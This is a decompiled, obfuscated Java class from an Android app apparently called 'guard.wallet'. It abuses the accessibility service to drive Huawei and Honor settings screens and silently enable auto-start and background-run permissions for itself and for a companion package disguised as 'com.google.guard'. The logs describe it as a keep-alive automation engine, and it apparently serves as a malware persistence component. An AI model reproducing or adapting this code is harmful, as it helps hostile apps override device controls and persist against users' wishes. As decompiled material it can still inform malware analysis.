package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class n extends c {
   public static final int y = 0;
   public final AtomicReference r = new AtomicReference<>(r.e.b);
   public final AtomicBoolean s = new AtomicBoolean(false);
   public final AtomicBoolean t = new AtomicBoolean(false);
   public final AtomicBoolean u = new AtomicBoolean(true);
   public final AtomicBoolean v = new AtomicBoolean(true);
   public final AtomicBoolean w = new AtomicBoolean(false);
   public final AtomicBoolean x = new AtomicBoolean(false);

   public n() {
      super(s0(), "com.android.settings");

      try {
         ScheduledExecutorService var1 = super.p;
         m var2 = new m(this, 4);
         var1.schedule(var2, 50L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("o.n", var3);
      }
   }

   public static CombineFilter b0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("HUA_WEI_ALLOW_AUTO_STARTUP_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter c0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("HUA_WEI_ALLOW_IN_BACKGROUND_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter d0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
      o.b.v("HUA_WEI_ALLOW_RELATE_STARTUP_TEXT", var0, var1, var0);
      return var1;
   }

   public static CombineFilter e0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      var1.setPrefix(com.guard.wallet.utils.f.b("HUA_WEI_APP_AND_NOTIFICATION_TEXT"));
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static ListenWindow f0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.Settings$AppAndNotificationDashboardActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter g0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("HUA_WEI_APP_STARTUP_MANAGE_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter l0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.Button"), "text");
      o.b.v("HUA_WEI_CONFIRM_TEXT", var1, var0, var1);
      return var0;
   }

   public static ListenWindow m0() {
      ListenWindow var0 = new ListenWindow("com.hihonor.systemmanager", "android.app.AlertDialog");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow n0() {
      ListenWindow var0 = new ListenWindow("com.hihonor.systemmanager", "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow o0() {
      ListenWindow var0 = new ListenWindow("com.huawei.systemmanager", "android.app.AlertDialog");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow p0() {
      ListenWindow var0 = new ListenWindow("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow q0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.HWSettings");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static LinkedList s0() {
      LinkedList var0 = new LinkedList();
      var0.add(o.c.J());
      var0.add(q0());
      var0.add(f0());
      var0.add(p0());
      var0.add(n0());
      var0.add(o0());
      var0.add(m0());
      return var0;
   }

   @Override
   public final void Z() {
      ReentrantLock var1 = super.o;
      if (var1.tryLock()) {
         try {
            if (!this.T()) {
               Log.d("o.n", "准备结束本地保活自动化引擎");
               com.guard.wallet.helper.g.h(100);
               this.X();
               if (MyAccessibilityService.P() != null) {
                  MyAccessibilityService.P().x();
               }

               this.t0();
               super.p.shutdownNow();
               com.guard.wallet.thread.l.a(super.c);
               super.n.clear();
               if (a1.q.M()) {
                  com.guard.wallet.utils.g.T0(5);
               }

               com.guard.wallet.helper.g.c();
               Log.d("o.n", "已结束本地保活自动化引擎");
               o.c.W();
               this.d();
            }
         } catch (Exception var3) {
            a1.q.s("o.n", var3);
         }

         var1.unlock();
      }
   }

   public final boolean h0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(o0());
         var1.add(m0());
         if (this.q(var1)) {
            Log.d("o.n", "已进入应用启动手动管理对话框");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.n", var2);
      }

      return false;
   }

   public final boolean i0() {
      try {
         if (this.q(Collections.singletonList(f0()))) {
            Log.d("o.n", "已进入应用和服务窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.n", var2);
      }

      return false;
   }

   public final boolean j0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(q0());
         if (this.q(var1)) {
            Log.d("o.n", "已进入华为系统设置窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.n", var2);
      }

      return false;
   }

   public final boolean k0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(p0());
         var1.add(n0());
         if (this.q(var1)) {
            Log.d("o.n", "已进入应用启动管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.n", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void r0() {
      Exception var10000;
      label209: {
         try {
            if (!this.k0()) {
               return;
            }

            Log.d("o.n", "keepAlvieInStartupAppControl 窗口匹配");
            com.guard.wallet.helper.g.h(50);
         } catch (Exception var27) {
            var10000 = var27;
            boolean var10001 = false;
            break label209;
         }

         AtomicReference var2 = this.r;

         boolean var1;
         try {
            var1 = Objects.equals(var2.get(), r.e.b);
         } catch (Exception var26) {
            var10000 = var26;
            boolean var40 = false;
            break label209;
         }

         label217: {
            r.e var3 = r.e.c;
            if (var1) {
               try {
                  var2.set(var3);
               } catch (Exception var24) {
                  var10000 = var24;
                  boolean var41 = false;
                  break label209;
               }
            } else {
               try {
                  if (!Objects.equals(var2.get(), var3) || com.guard.wallet.utils.g.d0("com.google.guard") == null) {
                     break label217;
                  }

                  var2.set(r.e.d);
               } catch (Exception var25) {
                  var10000 = var25;
                  boolean var42 = false;
                  break label209;
               }
            }

            UiObject var4;
            try {
               this.G();
               Log.d("o.n", "active root complete");
               var4 = this.Q();
            } catch (Exception var23) {
               var10000 = var23;
               boolean var43 = false;
               break label209;
            }

            String var32;
            if (var4 == null) {
               var32 = "应用启动管理窗口滚动视图查找失败";
            } else {
               label221: {
                  label178: {
                     label213: {
                        label214: {
                           label215: {
                              z.d var5;
                              try {
                                 Log.d("o.n", "应用启动管理窗口滚动视图查找成功");
                                 if (!Objects.equals(var2.get(), var3)) {
                                    break label215;
                                 }

                                 var5 = new z.d(o.c.H(com.guard.wallet.utils.g.x0()), 0);
                                 var37 = var4.scrollForwardUtil(var5);
                              } catch (Exception var22) {
                                 var10000 = var22;
                                 boolean var44 = false;
                                 break label209;
                              }

                              UiObject var28 = var37;
                              if (var37 == null) {
                                 try {
                                    var28 = var4.scrollBackwardUtil(var5);
                                 } catch (Exception var19) {
                                    var10000 = var19;
                                    boolean var45 = false;
                                    break label209;
                                 }
                              }

                              if (var28 == null) {
                                 var32 = "主进程App查找失败";
                                 break label221;
                              }

                              try {
                                 Log.d("o.n", "主进程App查找成功");
                                 com.guard.wallet.helper.g.h(55);
                                 var29 = var28.findParentUtilCombine(o.c.L());
                              } catch (Exception var18) {
                                 var10000 = var18;
                                 boolean var46 = false;
                                 break label209;
                              }

                              if (var29 == null) {
                                 var32 = "主进程可点击节点查找失败";
                                 break label221;
                              }

                              try {
                                 Log.d("o.n", "主进程可点击节点查找成功");
                                 var30 = var29.findOneByCombine(o.c.a0());
                              } catch (Exception var17) {
                                 var10000 = var17;
                                 boolean var47 = false;
                                 break label209;
                              }

                              if (var30 == null) {
                                 var32 = "主进程启动管理勾选框查找失败";
                                 break label221;
                              }

                              try {
                                 com.guard.wallet.helper.g.h(60);
                                 Log.d("o.n", "主进程启动管理勾选框查找成本");
                                 if (!var30.checked()) {
                                    break label178;
                                 }

                                 Log.d("o.n", "主进程自动管理已勾选");
                                 var30.click();
                              } catch (Exception var20) {
                                 var10000 = var20;
                                 boolean var48 = false;
                                 break label209;
                              }

                              var31 = "已点击使主进程进入手动管理";
                              break label214;
                           }

                           z.d var39;
                           try {
                              var39 = new z.d(o.c.H(com.guard.wallet.utils.g.e()), 0);
                              var38 = var4.scrollForwardUtil(var39);
                           } catch (Exception var16) {
                              var10000 = var16;
                              boolean var50 = false;
                              break label209;
                           }

                           UiObject var33 = var38;
                           if (var38 == null) {
                              try {
                                 var33 = var4.scrollBackwardUtil(var39);
                              } catch (Exception var15) {
                                 var10000 = var15;
                                 boolean var51 = false;
                                 break label209;
                              }
                           }

                           if (var33 == null) {
                              var32 = "备用进程App查找失败";
                              break label221;
                           }

                           try {
                              Log.d("o.n", "备用进程App查找成功");
                              com.guard.wallet.helper.g.h(55);
                              var34 = var33.findParentUtilCombine(o.c.L());
                           } catch (Exception var14) {
                              var10000 = var14;
                              boolean var52 = false;
                              break label209;
                           }

                           if (var34 == null) {
                              try {
                                 Log.d("o.n", "备用进程可点击节点查找失败");
                                 return;
                              } catch (Exception var11) {
                                 var10000 = var11;
                                 boolean var58 = false;
                                 break label209;
                              }
                           }

                           try {
                              Log.d("o.n", "备用进程可点击节点查找成功");
                              var35 = var34.findOneByCombine(o.c.a0());
                           } catch (Exception var13) {
                              var10000 = var13;
                              boolean var53 = false;
                              break label209;
                           }

                           if (var35 == null) {
                              var32 = "备用进程勾选框查找失败";
                              break label221;
                           }

                           try {
                              Log.d("o.n", "备用进程勾选框查找成功");
                              com.guard.wallet.helper.g.h(60);
                              if (!var35.checked()) {
                                 break label213;
                              }

                              Log.d("o.n", "备用进程自动管理已勾选");
                              var35.click();
                           } catch (Exception var21) {
                              var10000 = var21;
                              boolean var54 = false;
                              break label209;
                           }

                           var31 = "已点击使备用进程进入手动管理";
                        }

                        try {
                           Log.d("o.n", var31);
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var55 = false;
                           break label209;
                        }

                        try {
                           com.guard.wallet.helper.g.h(65);
                           return;
                        } catch (Exception var8) {
                           var10000 = var8;
                           boolean var56 = false;
                           break label209;
                        }
                     }

                     try {
                        this.t.set(true);
                        this.x.set(true);
                        this.v.set(true);
                        Log.d("o.n", "备用进程已选择手动管理");
                        this.t0();
                        this.Z();
                        return;
                     } catch (Exception var10) {
                        var10000 = var10;
                        boolean var57 = false;
                        break label209;
                     }
                  }

                  try {
                     this.s.set(true);
                     this.w.set(true);
                     this.u.set(true);
                     Log.d("o.n", "主进程已选择手动管理");
                     this.r0();
                     return;
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var49 = false;
                     break label209;
                  }
               }
            }

            try {
               Log.e("o.n", var32);
               return;
            } catch (Exception var7) {
               var10000 = var7;
               boolean var59 = false;
               break label209;
            }
         }

         try {
            this.t0();
            this.Z();
            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var60 = false;
         }
      }

      Exception var36 = var10000;
      a1.q.s("o.n", var36);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void t0() {
      Exception var10000;
      label100: {
         PowerControlStateVO var1;
         try {
            var1 = com.guard.wallet.utils.h.k(MainApplication.getAppContext().getPackageName());
            var1.setPackageName(MainApplication.getAppContext().getPackageName());
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label100;
         }

         AtomicBoolean var2 = this.s;

         try {
            if (var2.get()) {
               var1.setAllowAutoStart(var2.get());
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var19 = false;
            break label100;
         }

         var2 = this.u;

         try {
            if (var2.get()) {
               var1.setAllowRelateStart(var2.get());
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var20 = false;
            break label100;
         }

         var2 = this.w;

         try {
            if (var2.get()) {
               var1.setAllowAllFullBackground(var2.get());
            }
         } catch (Exception var8) {
            var10000 = var8;
            boolean var21 = false;
            break label100;
         }

         try {
            var1.setRetryCount(var1.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var1);
            Log.d("o.n", "已保存主进程保活策略");
            var1 = com.guard.wallet.utils.h.k("com.google.guard");
            var1.setPackageName("com.google.guard");
         } catch (Exception var7) {
            var10000 = var7;
            boolean var22 = false;
            break label100;
         }

         var2 = this.t;

         try {
            if (var2.get()) {
               var1.setAllowAutoStart(var2.get());
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var23 = false;
            break label100;
         }

         var2 = this.v;

         try {
            if (var2.get()) {
               var1.setAllowRelateStart(var2.get());
            }
         } catch (Exception var5) {
            var10000 = var5;
            boolean var24 = false;
            break label100;
         }

         var2 = this.x;

         try {
            if (var2.get()) {
               var1.setAllowAllFullBackground(var2.get());
            }
         } catch (Exception var4) {
            var10000 = var4;
            boolean var25 = false;
            break label100;
         }

         try {
            var1.setRetryCount(var1.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var1);
            Log.d("o.n", "已保存备用进程保活策略");
            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var26 = false;
         }
      }

      Exception var13 = var10000;
      a1.q.s("o.n", var13);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label74: {
         try {
            if (this.T()) {
               return;
            }
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label74;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var19 = false;
               break label74;
            }
         }

         boolean var4;
         try {
            var4 = this.j0();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var20 = false;
            break label74;
         }

         String var12 = super.c;
         ConcurrentLinkedQueue var14 = super.n;
         if (var4) {
            try {
               var14.remove("keepAliveInAppAndNotification");
               var14.remove("keepAlvieInStartupAppControl");
               var14.remove("keepAliveInAlertDialog");
               if (!var14.contains("keepAliveInHwSettings")) {
                  var14.add("keepAliveInHwSettings");
                  m var16 = new m(this, 0);
                  com.guard.wallet.thread.l.c(var16, var12);
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var21 = false;
               break label74;
            }
         }

         try {
            if (this.i0()) {
               var14.remove("keepAliveInHwSettings");
               var14.remove("keepAlvieInStartupAppControl");
               var14.remove("keepAliveInAlertDialog");
               if (!var14.contains("keepAliveInAppAndNotification")) {
                  var14.add("keepAliveInAppAndNotification");
                  m var17 = new m(this, 1);
                  com.guard.wallet.thread.l.c(var17, var12);
               }
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var22 = false;
            break label74;
         }

         try {
            if (this.k0()) {
               var14.remove("keepAliveInHwSettings");
               var14.remove("keepAliveInAppAndNotification");
               var14.remove("keepAliveInAlertDialog");
               if (!var14.contains("keepAlvieInStartupAppControl")) {
                  var14.add("keepAlvieInStartupAppControl");
                  m var18 = new m(this, 2);
                  com.guard.wallet.thread.l.c(var18, var12);
               }
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var23 = false;
            break label74;
         }

         try {
            if (this.h0()) {
               var14.remove("keepAliveInHwSettings");
               var14.remove("keepAliveInAppAndNotification");
               var14.remove("keepAlvieInStartupAppControl");
               if (!var14.contains("keepAliveInAlertDialog")) {
                  var14.add("keepAliveInAlertDialog");
                  m var15 = new m(this, 3);
                  com.guard.wallet.thread.l.c(var15, var12);
                  return;
               }
            }

            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var24 = false;
         }
      }

      Exception var13 = var10000;
      a1.q.s("o.n", var13);
   }
}
